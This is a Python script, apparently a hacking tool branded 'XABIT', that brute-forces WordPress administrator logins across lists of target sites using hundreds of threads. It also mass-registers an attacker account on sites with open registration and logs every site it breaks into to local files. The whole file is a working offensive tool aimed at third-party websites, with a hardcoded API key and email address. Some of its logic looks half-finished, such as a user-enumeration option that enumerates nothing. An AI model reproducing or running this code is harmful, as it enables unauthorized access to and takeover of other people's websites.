import os
import requests
import time
from colorama import Fore, Style
from pyfiglet import figlet_format
from concurrent.futures import ThreadPoolExecutor
from queue import Queue

API_KEY = "IEq9GmbMtcapALpiL9jOow9tz3WRRDjbALxaN1JxVIQ"
MAX_THREADS = 600  # Increased to 600 threads
VERBOSE = True  # Enable verbose mode for debugging

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f'''
{Fore.RED}
▒██   ██▒    ▄▄▄          ▄▄▄▄       ██▓   ▄▄▄█████▓
▒▒ █ █ ▒░   ▒████▄       ▓█████▄    ▓██▒   ▓  ██▒ ▓▒
░░  █   ░   ▒██  ▀█▄     ▒██▒ ▄██   ▒██▒   ▒ ▓██░ ▒░
 ░ █ █ ▒    ░██▄▄▄▄██    ▒██░█▀     ░██░   ░ ▓██▓ ░
▒██▒ ▒██▒    ▓█   ▓██▒   ░▓█  ▀█▓   ░██░     ▒██▒ ░
▒▒ ░ ░▓ ░    ▒▒   ▓▒█░   ░▒▓███▀▒   ░▓       ▒ ░░
░░   ░▒ ░     ▒   ▒▒ ░   ▒░▒   ░     ▒ ░       ░
 ░    ░       ░   ▒       ░    ░     ▒ ░     ░
 ░    ░           ░  ░    ░          ░
                               ░
{Fore.RESET}

{Fore.YELLOW}THIS TOOL IS MADE BY XABIT v1.0 -- WORDPRESS PASSWORD CRACKER
LETS MAKE THE WORLD SAFER{Fore.RESET}
'''
    print(banner)

def format_url(url):
    if 'wp-login.php' in url:
        url = url.split('wp-login.php')[0].strip()
    return url.rstrip('/') + '/wp-login.php?action=register'

def fix_formatting(url):
    if '|' in url:
        url = url.replace('|', '#').replace('#', '@', 1)
    return url.split('#admin@password123')[0]  # Fix to prevent unwanted suffix

def exploit_wp_register(url):
    register_url = format_url(url)
    data = {
        'user_login': 'xxabitxploit_user',
        'user_email': 'nrnr551a@gmail.com',
        'wp-submit': 'Register'
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
        "Referer": register_url,
        "Content-Type": "application/x-www-form-urlencoded",
    }
    try:
        response = requests.post(register_url, data=data, headers=headers)
        if response.status_code == 302 or "checkemail=registered" in response.text:
            print(Fore.GREEN + f"[+] Success : {register_url}#xxabitxploit_user" + Style.RESET_ALL)
            with open("register_success.txt", "a") as f:
                f.write(f"[+] {register_url}#xxabitxploit_user\n")
        else:
            print(Fore.RED + f"[-] Failed to create user on {register_url}" + Style.RESET_ALL)
    except Exception as e:
        pass  # Suppressed connection errors as requested

def brute_force_site(url, username, password):
    login_url = url.rstrip('/') + '/wp-login.php'
    login_data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In'
    }
    try:
        response = requests.post(login_url, data=login_data)
        clean_url = url.split('#admin@password123')[0]  # Fix output format
        if "dashboard" in response.url or "wp-admin" in response.url:
            print(Fore.GREEN + f"[+] Success : {clean_url}" + Style.RESET_ALL)
            with open("loginsuccess.txt", "a") as f:
                f.write(f"{clean_url}\n")
        else:
            print(Fore.RED + f"[-] Failed to login on {clean_url}" + Style.RESET_ALL)
    except Exception as e:
        pass  # Suppressed connection errors as requested

def crack_passwords(sites_file, passwords_file):
    with open(sites_file, 'r') as s_file, open(passwords_file, 'r') as p_file:
        urls = [line.strip() for line in s_file.readlines()]
        passwords = [line.strip() for line in p_file.readlines()]

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        for url in urls:
            for password in passwords:
                executor.submit(brute_force_site, url, 'admin', password)

def main_menu():
    clear_screen()
    print_banner()
    print(Fore.YELLOW + "Choose an option:" + Fore.RESET)
    print(Fore.YELLOW + "1. Enumerate users and crack passwords" + Fore.RESET)
    print(Fore.YELLOW + "2. Bruteforce based on file (sites and credentials)" + Fore.RESET)
    print(Fore.YELLOW + "3. Dark Portal - WP Register Exploiter" + Fore.RESET)
    print(Fore.YELLOW + "4. Exit" + Fore.RESET)

    try:
        option = int(input("Enter your choice (1, 2, 3, or 4): "))
    except ValueError:
        print(Fore.RED + "Invalid input. Please enter a number." + Style.RESET_ALL)
        main_menu()
        return

    if option == 1:
        sites_file = input("Enter the name of the text file containing sites: ").strip()
        passwords_file = input("Enter the name of the text file containing passwords: ").strip()
        crack_passwords(sites_file, passwords_file)
    elif option == 2:
        target_file = input("Enter the file containing WordPress URLs: ").strip()
        with open(target_file, 'r') as file:
            for url in file:
                brute_force_site(fix_formatting(url.strip()), 'admin', 'password123')
    elif option == 3:
        target_file = input("Enter the file containing WordPress URLs: ").strip()
        with open(target_file, 'r') as file:
            for url in file:
                exploit_wp_register(url.strip())
    elif option == 4:
        print(Fore.YELLOW + "Exiting..." + Fore.RESET)
        exit()
    else:
        print(Fore.RED + "Invalid choice. Exiting." + Style.RESET_ALL)

    input("Press Enter to continue...")
    main_menu()

if __name__ == "__main__":
    main_menu()
